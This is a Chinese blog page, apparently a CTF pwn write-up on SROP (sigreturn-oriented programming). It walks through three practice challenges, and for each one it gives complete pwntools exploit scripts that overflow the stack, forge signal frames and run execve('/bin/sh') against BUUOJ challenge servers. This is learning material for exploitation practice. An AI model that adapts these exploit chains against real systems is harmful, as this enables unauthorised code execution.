@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本文详细记录了有关SROP漏洞的三道例题的复现过程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SROP总结">
+<meta property="og:url" content="http://example.com/post/SROP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Qwen&#39;s blog">
+<meta property="og:description" content="本文详细记录了有关SROP漏洞的三道例题的复现过程">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908713.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908087.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908737.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909604.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909651.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909642.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909763.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909062.png">
+<meta property="article:published_time" content="2024-01-22T10:52:39.000Z">
+<meta property="article:modified_time" content="2025-10-16T13:28:13.534Z">
+<meta property="article:author" content="Qwen">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="SROP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908713.png">
+
+<link rel="canonical" href="http://example.com/post/SROP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>SROP总结 | Qwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Qwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/post/SROP%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SROP总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-01-22 18:52:39" itemprop="dateCreated datePublished" datetime="2024-01-22T18:52:39+08:00">2024-01-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-10-16 21:28:13" itemprop="dateModified" datetime="2025-10-16T21:28:13+08:00">2025-10-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">pwn学习总结</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E6%A0%88/" itemprop="url" rel="index"><span itemprop="name">栈</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文详细记录了有关SROP漏洞的三道例题的复现过程</p>
+<span id="more"></span>
+
+<h2 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a><code>ciscn_2019_es_7</code></h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	系统调用了<code>sys_read</code>和<code>sys_write</code>，并且可以溢出<code>0x400-0x10</code>个字节</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908713.png" alt="image-20240122163539371"></p>
+<p>​	我们看到<code>mov rax,0fh;retn</code>的<code>gadget</code>，<code>0fh</code>是<code>sigreturn</code>函数的调用号，可以用<code>SROP</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908087.png" alt="image-20240122152721309"></p>
+<p>​	程序中没有<code>/bin/sh</code>，我们可以在<code>sys_read(0,buf,0x400ull)</code>这一过程中先把<code>/bin/sh</code>写到<code>buf</code>中，然后<code>sys_write(1u,buf,0x30ull)</code>这一过程会把<code>buf</code>及后面的内容共<code>0x30</code>个字节打印出来，这样我们就可以泄漏一个栈地址，然后计算其与<code>/bin/sh</code>的地址的偏移，表示出<code>/bin/sh</code>的地址。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">one_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(one_addr))</span><br><span class="line">binsh_addr = one_addr-<span class="number">0x148</span></span><br><span class="line"><span class="comment">#binsh_addr = one_addr-0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br></pre></td></tr></table></figure>
+
+<p>​	得到<code>/bin/sh</code>的地址后，构造一个<code>execve</code>的<code>signal frame</code>，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve  <span class="comment">#execve的系统调用号</span></span><br><span class="line">frame.rdi = binsh_addr  <span class="comment">#第一个参数</span></span><br><span class="line">frame.rsi = <span class="number">0</span>  <span class="comment">#第二个参数</span></span><br><span class="line">frame.rdx = <span class="number">0</span>  <span class="comment">#第三个参数</span></span><br><span class="line">frame.rip = syscall_addr  <span class="comment">#下面解释</span></span><br></pre></td></tr></table></figure>
+
+<p>​	首先我们要知道，<code>rip</code>是一个指令指针的寄存器，也就是说<code>rip</code>寄存器中存放的是要执行的下一条指令的地址。而<code>frame.rip</code>中存放的是 当<code>sigreturn</code>系统调用返回后要执行的下一条指令的地址。这里的<code>frame.rip = syscall_leave_ret</code>就表示我们将要执行<code>syscall</code>指令，又因为我们已经设置了<code>execve</code>的<code>signal frame</code>，所以我们就控制了程序的执行流执行<code>execve</code>系统调用。</p>
+<p>​	构造第二个<code>payload</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mov_rax_0fh = <span class="number">0x4004da</span></span><br><span class="line">payload = payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(mov_rax_0fh)+p64(syscall_addr)  <span class="comment">#sigreturn的调用号是0xf</span></span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>​	一开始我把<code>payload = payload = b&#39;/bin/sh\x00&#39;.ljust(16,b&#39;\x00&#39;)</code>写成<code>payload = b&#39;a&#39;*16</code>打不通。调试的时候发现，<code>vuln</code>函数是又被循环了一次，这个<code>payload</code>是会往<code>buf</code>中写覆盖原来的内容，也就是说我们上面泄漏的地址<code>binsh_addr</code>，中的内容会变成这次发送的前<code>8</code>个字节。所以我们构造的<code>payload</code>的前<code>8</code>个字节必须是<code>/bin/sh\x00</code>。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26868</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./es7&#x27;)</span></span><br><span class="line">context.arch =<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">one_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(one_addr))</span><br><span class="line"><span class="comment">#binsh_addr = one_addr-0x148</span></span><br><span class="line">binsh_addr = one_addr-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"><span class="comment">#0x148是本地的偏移量，远程的应该是0x118，本地与远程的libc不同</span></span><br><span class="line"></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh_addr  </span><br><span class="line">frame.rsi = <span class="number">0</span>  </span><br><span class="line">frame.rdx = <span class="number">0</span>  </span><br><span class="line">frame.rip = syscall_addr </span><br><span class="line"></span><br><span class="line">mov_rax_0fh = <span class="number">0x4004da</span></span><br><span class="line">payload = payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(mov_rax_0fh)+p64(syscall_addr) </span><br><span class="line">payload += <span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171908737.png" alt="image-20240122171324394"></p>
+<h2 id="rootersctf-2019-srop"><a href="#rootersctf-2019-srop" class="headerlink" title="rootersctf_2019_srop"></a><code>rootersctf_2019_srop</code></h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>​	我们分析代码，发现连<code>main</code>函数都没有，整个程序就是先<code>call 0x401000</code>，然后<code>exit</code>退出。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909604.png" alt="image-20240206133317497"></p>
+<p>​	跳到地址为<code>0x401000</code>这里，分析汇编代码，<code>2</code>个系统调用，<code>write(1,buf,0x2a),read(0,rsp-0x40,0x400)</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909651.png" alt="image-20240206132903020"></p>
+<p>​	程序中没有<code>/bin/sh</code>，所以我们要先往一个地址中写入<code>/bin/sh</code>。如果我们直接写入<code>/bin/sh</code>再<code>srop</code>，我们不能知道<code>/bin/sh</code>的地址，所以可以先栈迁移到<code>data</code>段，<code>data</code>段的地址已知且不变，这样我们就拿到<code>/bin/sh</code>的地址了，设置<code>read</code>的一些寄存器值，如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buf_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>  <span class="comment">#read的系统调用号</span></span><br><span class="line">frame.rdi = <span class="number">0</span>  <span class="comment">#标准输入</span></span><br><span class="line">frame.rsi = buf_addr  <span class="comment">#写入的位置的起始地址</span></span><br><span class="line">frame.rdx = <span class="number">0x400</span>  <span class="comment">#可以写入的字节个数</span></span><br><span class="line">frame.rip = syscall_leave_ret  <span class="comment">#syscall系统调用read</span></span><br><span class="line">frame.rbp = buf_addr+<span class="number">0x20</span></span><br></pre></td></tr></table></figure>
+
+<p>不过这里<code>frame.rbp = buf_addr+0x20</code>的作用是什么？）</p>
+<p>​	然后我们可以构造第一个<code>payload</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line"><span class="comment"># srop to call read, set *data_addr = /bin/sh\x00</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, payload)</span><br></pre></td></tr></table></figure>
+
+<p>​	上面构造的<code>signal frame</code>再次<code>syscall</code>了一个<code>read</code>系统调用，下面我们就可以往<code>buf_addr = 0x402000</code>里写入<code>/bin/sh</code>，并再次构造一个<code>signal frame</code>系统调用<code>execve</code>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>  <span class="comment">#execve的系统调用号</span></span><br><span class="line">frame.rdi = buf_addr  <span class="comment">#/bin/sh的地址</span></span><br><span class="line">frame.rsi = <span class="number">0</span>  <span class="comment">#第二个参数</span></span><br><span class="line">frame.rdx = <span class="number">0</span>  <span class="comment">#第三个参数</span></span><br><span class="line">frame.rip = syscall_leave_ret  <span class="comment">#</span></span><br><span class="line"><span class="comment">#frame.rbp =   #没有rbp了</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./srop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26592</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0x402000</span></span><br><span class="line">syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span> </span><br><span class="line">frame.rdi = <span class="number">0</span>  </span><br><span class="line">frame.rsi = buf_addr </span><br><span class="line">frame.rdx = <span class="number">0x400</span> </span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line">frame.rbp = buf_addr+<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hey, can i get some feedback for the CTF?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = buf_addr</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(pop_rax_syscall_leave_ret)+p64(<span class="number">0xf</span>)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909642.png" alt="image-20240206160012074"></p>
+<h2 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a><code>360chunqiu2017_smallest</code></h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>我们每次控制寄存器的时候，都把<code>rsp</code>写成下一个片段的<code>rt_sigreturn</code>的地址，并且<code>rip</code>的地址要指向<code>syscall；ret</code> 一定要后面有<code>ret</code>，不然所有的片段连不起来，到<code>ret</code>的时候，就会去执行<code>rsp</code>执行的地址，因此我们就可以一直劫持程序的控制流。</p>
+<p>​	程序很简单，只有下面一个函数，分析一下代码就是一个<code>read</code>系统调用，可以栈溢出并且能够溢出的字节数很长。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sys_read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;retaddr, <span class="number">0x400u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909763.png" alt="image-20240207130130852"></p>
+<p>​	这道题既然是用<code>srop</code>，那么必然是需要能够调用<code>sigreturn</code>，也就是需要把<code>rax</code>寄存器的值设置为<code>0xf</code>。我们发现并没有能够实现这个的相关的<code>gadget</code>，但是我们突然想到<code>read</code>返回值就是存储在<code>rax</code>寄存器中的，我们可以利用这个来设置<code>rax</code>寄存器的值。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">start_addr = <span class="number">0x4000b0</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line"><span class="comment">#第一个start去让第一次正常运行的ret返回到start</span></span><br><span class="line"><span class="comment">#第二个start让\xB3输入进来，此时去改变了栈顶的start，此时它跳过了xor rax,rax，并</span></span><br><span class="line"><span class="comment">#且它的下面还有一个start</span></span><br><span class="line"><span class="comment">#最下面的start是让我们可以再输入frame，一直控制程序执行流</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">b&#x27;\xB3&#x27;</span>)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">leak_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr = leak_addr-<span class="number">0x2000</span><span class="comment">#减去0x2000，把payload写到该地址</span></span><br></pre></td></tr></table></figure>
+
+<p><code>exp</code>如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29210</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./smallest&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">syscall_ret_addr = <span class="number">0x4000be</span></span><br><span class="line">start_addr = <span class="number">0x4000b0</span></span><br><span class="line">payload = p64(start_addr)*<span class="number">3</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">b&#x27;\xB3&#x27;</span>)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">leak_addr = u64(p.recv()[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">target_addr = leak_addr-<span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>  </span><br><span class="line">frame.rdi = <span class="number">0</span>  </span><br><span class="line">frame.rsi = target_addr </span><br><span class="line">frame.rdx = <span class="number">0x400</span> </span><br><span class="line">frame.rip = syscall_ret_addr  </span><br><span class="line">frame.rsp = target_addr  </span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">payload = p64(syscall_ret_addr)+<span class="string">b&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">binsh_addr = target_addr+<span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>  </span><br><span class="line">frame.rdi = binsh_addr  </span><br><span class="line">frame.rsi = <span class="number">0</span>  </span><br><span class="line">frame.rdx = <span class="number">0</span>  </span><br><span class="line">frame.rip = syscall_ret_addr</span><br><span class="line">payload = p64(start_addr)+<span class="string">b&#x27;aaaaaaaa&#x27;</span>+<span class="built_in">bytes</span>(frame).ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line">payload = p64(syscall_ret_addr)+<span class="string">b&#x27;bbbbbbb&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">wait = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501171909062.png" alt="image-20240219151202950"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/SROP/" rel="tag"># SROP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/BUU%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="prev" title="BUU刷题记录">
+      <i class="fa fa-chevron-left"></i> BUU刷题记录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" rel="next" title="格式化字符串漏洞学习总结">
+      格式化字符串漏洞学习总结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
